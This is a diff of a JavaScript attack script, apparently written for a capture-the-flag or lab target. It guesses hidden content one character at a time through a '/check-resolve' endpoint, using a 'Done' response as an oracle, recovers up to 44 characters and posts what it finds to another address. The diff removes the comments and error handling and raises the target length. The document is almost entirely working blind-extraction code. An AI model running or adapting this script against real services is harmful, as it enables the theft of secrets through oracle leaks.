@@ -1,6 +1,6 @@
 // Base information
 const url = '/check-resolve';
-const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'; // Include all ASCII characters
+const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&()*+,-./:;<=>?@[]^_`{|}~'; 
 let discovered_content = '';
 
 // Function to check if a character is correct
@@ -17,12 +17,12 @@ function checkCharacter(position, character) {
   })
   .then(response => response.text())
   .then(text => {
-    if (text.includes("Done")) { // Assuming "Done" indicates success
+    if (text.includes("Done")) {
       discovered_content += character;
       console.log(`Found char at position ${position}: ${character}`);
-      return true; // Correct character found
+      return true; 
     }
-    return false; // Incorrect character, continue searching
+    return false; 
   });
 }
 
@@ -40,35 +40,21 @@ function postDiscoveredContent() {
     },
     body: postData
   })
-  .then(response => response.text()) // Assuming response is text
-  .then(text => {
-    console.log('Discovered content was successfully posted.');
-  })
-  .catch(error => {
-    console.error('Failed to post discovered content:', error);
-  });
 }
 
-// Main function to find the content
 async function findContent() {
-  let content_length = 2; // Adjust based on expected length
+  let content_length = 44; 
   for (let position = 1; position <= content_length; position++) {
     let found_char = false;
     for (const char of characters) {
       const found = await checkCharacter(position, char);
       if (found) {
         found_char = true;
-        break; // Move to the next character position
+        break; 
       }
     }
-    if (!found_char) {
-      console.log(`Character at position ${position} not found, assuming end of content.`);
-      break; // Assume end of content if no character is found for the current position
-    }
   }
-  console.log(`Discovered content: ${discovered_content}`);
-  postDiscoveredContent(); // Post the discovered content once it is fully discovered
+  postDiscoveredContent(); 
 }
 
-// Start the process
 findContent();
